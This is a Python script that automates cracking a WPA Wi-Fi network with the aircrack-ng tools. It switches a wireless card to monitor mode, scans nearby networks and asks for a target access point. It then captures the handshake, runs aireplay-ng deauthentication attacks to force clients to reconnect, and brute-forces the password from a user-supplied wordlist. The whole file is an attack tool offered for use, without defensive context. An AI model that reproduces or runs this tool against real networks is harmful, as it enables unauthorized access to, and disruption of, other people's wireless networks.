from os import system
from time import sleep
import subprocess
import csv
import os
import signal
import pexpect

# Ask for name of scan for creating directory
directory_name = input("Enter the project name ")

# Create directory for all files created during the attack
fullPath = os.getcwd()+"/"+directory_name
try:
    os.mkdir(fullPath)
except OSError:
    print("The directory "+fullPath+" could not be created")
else:
    print("The directory "+fullPath+" was created")


# asks for wireless card to apply monitor mode on it
wireless_card = input("Enter your wireless card: ")

airmonkill = "airmon-ng check kill"
subprocess.call(airmonkill)
airmonstart = "airmon-ng start "+wireless_card
subprocess.call(airmonstart)
wireless_card = wireless_card+"mon"

csvpath = fullPath+"/"+directory_name
# runs a scan with airodump-ng to get available wifi

cmd_airodump = pexpect.spawn('airodump-ng '+wireless_card+' --output-format csv -w '+csvpath)
cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], 10)

with open(csvpath+'-01.csv', 'r') as csvfile:
    wifireader = csv.reader(csvfile, delimiter=' ', quotechar='|', skipinitialspace=True)
    for row in wifireader:
        print(', '.join(row))


# asks for your target's bssid
bssid = input("Enter the BSSID of the network you want to crack: ")

channel = None
mac_address = None

with open(csvpath+'-01.csv', 'r') as csvfile2:
    reader = csv.reader(csvfile2,skipinitialspace=True)
    next(reader,None)
    for row in reader:
        if str(row[13]) == bssid:
            channel = row[3]
            mac_address = row[0]
            print("SSID \'"+bssid+"\' found on channel "+channel+" with MAC-address "+mac_address)
            break

print ("Airodump will start, in the meanwhile, run deauth.py in a new terminal")
sleep(2)

# starts airodump-ng on a network to capture handshakes and open new xterm to deauth connected devices
airodump2 = 'timeout 15s airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(channel, mac_address, csvpath+"_handshake", wireless_card)
airodump_subprocess = subprocess.Popen(airodump2, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
sleep(5)
# Deauthenticate the access point
deauth = "aireplay-ng -0 {0} -a {1} {2}".format(5,mac_address,wireless_card)
system(deauth)

sleep(15)
print("Cracking the handshake with aircrack-ng is starting...")

# 'Aircrack-ng' parameters set
wordlist = input("Specify the path to your wordlist dictionary: ")
print ("This could take a while according to the wordlist you are using, so be patient!")
crack = 'aircrack-ng -a 2 {0} -w {1} '.format(csvpath+"_handshake-01.cap", wordlist)
system(crack)
os.killpg(os.getpgid(airodump_subprocess.pid), signal.SIGTERM)

system(airmonkill)